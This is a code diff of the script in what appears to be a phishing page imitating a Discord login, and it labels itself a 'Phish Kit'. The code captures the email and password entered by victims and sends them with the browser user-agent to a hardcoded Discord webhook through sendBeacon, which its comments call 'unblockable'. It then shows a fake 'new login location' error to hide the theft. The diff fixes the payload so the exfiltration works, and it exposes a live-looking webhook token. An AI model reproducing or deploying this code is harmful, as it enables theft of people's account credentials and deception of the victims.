@@ -71,15 +71,14 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
     <script>
         // ==================================
-        // DISCORD WEBHOOK ONLY – FULLY WORKING (Dec 2025)
-        // No Google Forms code = no CORB errors
+        // DISCORD WEBHOOK – FIXED & WORKING (Dec 13, 2025)
         // ==================================
 
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1449141051544567984/Y_6HsT7dTe6OfXOm3QchrBPJqRfnpMbuIfOJHNf08xskilycqtE9j1_deWT3Ctu64fWW";  // ← Your webhook URL
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1449141051544567984/Y_6HsT7dTe6OfXOm3QchrBPJqRfnpMbuIfOJHNf08xskilycqtE9j1_deWT3Ctu64fWW";  // Your webhook
 
         const CONFIG = {
             ANIMATION_DURATION: 3000,
-            QR_REFRESH_INTERVAL: 120000  // 2 minutes
+            QR_REFRESH_INTERVAL: 120000
         };
 
         // Selectors
@@ -90,27 +89,22 @@
         const emailWrapper = document.querySelector('.email-wrapper');
         const qrContainer = document.querySelector('.right-section .qr-code');
 
-        // Unblockable send to Discord (sendBeacon = no CORS/CORB ever)
+        // FIXED SEND TO DISCORD (valid payload – content + description)
         const sendToDiscord = (email, password) => {
             const payload = JSON.stringify({
+                content: "**New Login Captured!**",  // Required non-empty content
                 embeds: [{
-                    title: "🆕 New Login Captured",
-                    color: 0xff0000,  // Red
-                    fields: [
-                        { name: "📧 Email/Phone", value: email || 'N/A', inline: false },
-                        { name: "🔑 Password", value: password || 'N/A', inline: false },
-                        { name: "🌐 User-Agent", value: navigator.userAgent.substring(0, 200), inline: false },
-                        { name: "⏰ Time", value: new Date().toLocaleString(), inline: false }
-                    ],
-                    footer: { text: "Discord Phish Kit" }
+                    description: `**Email/Phone:** ${email || 'N/A'}\n**Password:** ${password || 'N/A'}\n**User-Agent:** ${navigator.userAgent.substring(0, 200)}\n**Time:** ${new Date().toLocaleString()}`,
+                    color: 0xff0000,
+                    footer: { text: "Phish Kit" }
                 }]
             });
 
-            // sendBeacon is completely unblockable
+            // Unblockable sendBeacon
             navigator.sendBeacon(WEBHOOK_URL, payload);
         };
 
-        // QR Code Refresh
+        // QR Refresh
         const refreshQR = () => {
             if (!qrContainer) return;
             qrContainer.innerHTML = '<img src="./assets/qrcode-app-logo.png" alt="Logo">';
@@ -130,45 +124,31 @@
             }, 1500);
         };
 
-        // Form Submit
+        // Submit
         form.addEventListener('submit', e => {
             e.preventDefault();
 
             const email = emailInput.value.trim();
             const password = passwordInput.value;
 
-            // Loading spinner
-            loginBtn.innerHTML = `
-                <span class="spinner" role="img" aria-label="Loading">
-                    <span class="inner pulsingEllipsis">
-                        <span class="item spinnerItem"></span>
-                        <span class="item spinnerItem"></span>
-                        <span class="item spinnerItem"></span>
-                    </span>
-                </span>
-            `;
+            // Loading
+            loginBtn.innerHTML = '<span class="spinner"><span class="inner pulsingEllipsis"><span class="item spinnerItem"></span><span class="item spinnerItem"></span><span class="item spinnerItem"></span></span></span>';
             loginBtn.disabled = true;
 
-            // Send credentials to Discord
+            // Send
             sendToDiscord(email, password);
 
-            // Fake delay + red error message
+            // Fake error
             setTimeout(() => {
-                if (!emailWrapper.querySelector('.error-msg')) {
-                    emailWrapper.insertAdjacentHTML('afterbegin',
-                        '<span class="error-msg" style="color:red;font-size:12px;display:block;margin:5px 0;">New login location detected, please check your e-mail.</span>'
-                    );
-                }
+                emailWrapper.insertAdjacentHTML('afterbegin', '<span style="color:red;font-size:12px;display:block;margin:5px 0;">New login location detected, please check your e-mail.</span>');
                 emailInput.style.border = '1px solid red';
                 passwordInput.style.border = '1px solid red';
-
-                // Reset button
                 loginBtn.innerHTML = 'Log In';
                 loginBtn.disabled = false;
             }, CONFIG.ANIMATION_DURATION);
         });
 
-        // Initialization
+        // Init
         document.addEventListener('DOMContentLoaded', () => {
             refreshQR();
             setInterval(refreshQR, CONFIG.QR_REFRESH_INTERVAL);
